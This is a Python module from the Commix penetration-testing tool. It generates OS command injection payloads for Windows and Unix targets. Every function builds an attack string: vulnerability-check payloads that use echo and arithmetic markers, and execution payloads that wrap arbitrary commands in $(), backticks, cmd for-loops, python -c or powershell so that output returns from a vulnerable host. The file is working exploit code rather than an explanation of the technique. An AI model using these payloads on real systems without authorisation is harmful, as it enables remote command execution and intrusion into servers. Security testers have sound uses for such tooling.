#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (http://commixproject.com).
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings

"""
The classic injection technique on Classic OS Command Injection.
The available "classic" payloads.
"""

"""
Classic decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == "win":
    if settings.SKIP_CALC:
      payload = (separator +
                "echo " + TAG + TAG + TAG + "< nul"
                )
    else:
        payload = (separator +
              "for /f \"tokens=*\" %i in ('cmd /c \"" + 
              "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
              "\"') do @set /p = " + TAG + "%i" + TAG + TAG + "< nul"
              )  
  else:
    if not settings.WAF_ENABLED:
      if settings.USE_BACKTICKS:
        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
      else:  
        math_calc = "$((" + str(randv1) + "%2B" + str(randv2) + "))"
    else:
      if settings.USE_BACKTICKS:
        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
      else:
        math_calc = "$(expr " + str(randv1) + " %2B " + str(randv2) + ")"

    if settings.SKIP_CALC:
      if settings.USE_BACKTICKS:
        payload = (separator +
                  "echo " + TAG +
                  TAG + "" + TAG + ""
                   )  
      else:  
        payload = (separator +
                  "echo " + TAG +
                  "$(echo " + TAG + ")" + TAG + ""
                   ) 
    else:
      if settings.USE_BACKTICKS:
        payload = (separator +
                  "echo " + TAG +
                  math_calc + 
                  TAG + "" + TAG + ""
                   )       
      else:  
        payload = (separator +
                  "echo " + TAG +
                  math_calc + 
                  "$(echo " + TAG + ")" + TAG + ""
                   ) 
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == "win":
    if settings.SKIP_CALC: 
      python_payload = settings.WIN_PYTHON_DIR + " -c \"print '" + TAG + "'%2B'" + TAG + "'%2B'" + TAG + "'\""
    else:
      python_payload = settings.WIN_PYTHON_DIR + " -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
     
    payload = (separator +
              "for /f \"tokens=*\" %i in ('cmd /c " + 
              python_payload +
              "') do @set /p =%i< nul"
              )
  else:
    if settings.SKIP_CALC:
      payload = (separator +
                "python -c \"print'" + TAG +
                TAG + 
                TAG + "'\""
                )
    else:
      payload = (separator +
                "python -c \"print'" + TAG +
                "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + 
                TAG + "'%2B'" + 
                TAG + "'\""
                )
  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, TAG, cmd):
  if settings.TARGET_OS == "win":
    if settings.REVERSE_TCP:
      payload = (separator + cmd + " "
                )
    else:
      payload = (separator +
                "for /f \"tokens=*\" %i in ('cmd /c \"" + 
                cmd + 
                "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + "< nul"
                )
  else:
     
    # if not settings.WAF_ENABLED:
    #   cmd_exec = "$(echo $(" + cmd + "))"
    # else:

    if settings.USE_BACKTICKS:
      cmd_exec = "`" + cmd + "`"
      payload = (separator +
                "echo " + TAG +
                "" + TAG + "" +
                cmd_exec +
                "" + TAG + "" + TAG + ""
                )
    else:
      cmd_exec = "$(" + cmd + ")"
      payload = (separator +
                "echo " + TAG +
                "$(echo " + TAG + ")" +
                cmd_exec +
                "$(echo " + TAG + ")" + TAG + ""
                )
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, TAG, cmd):
  if settings.TARGET_OS == "win":
    if settings.REVERSE_TCP:
      payload = (separator + cmd + " "
                )
    else:
      payload = (separator +
                "for /f \"tokens=*\" %i in ('" + 
                settings.WIN_PYTHON_DIR + " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
                "') do @set /p =%i< nul"
                )
                                                                      
  else:

    if settings.USE_BACKTICKS:
      payload = (separator +
                "python -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'`" + cmd + "`" + TAG + "'%2B'" + TAG + "'\""
                )
    else:              
      payload = (separator +
                "python -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'$(" + cmd + ")'%2B'" + TAG + "'%2B'" + TAG + "'\""
                )
  return payload

#eof
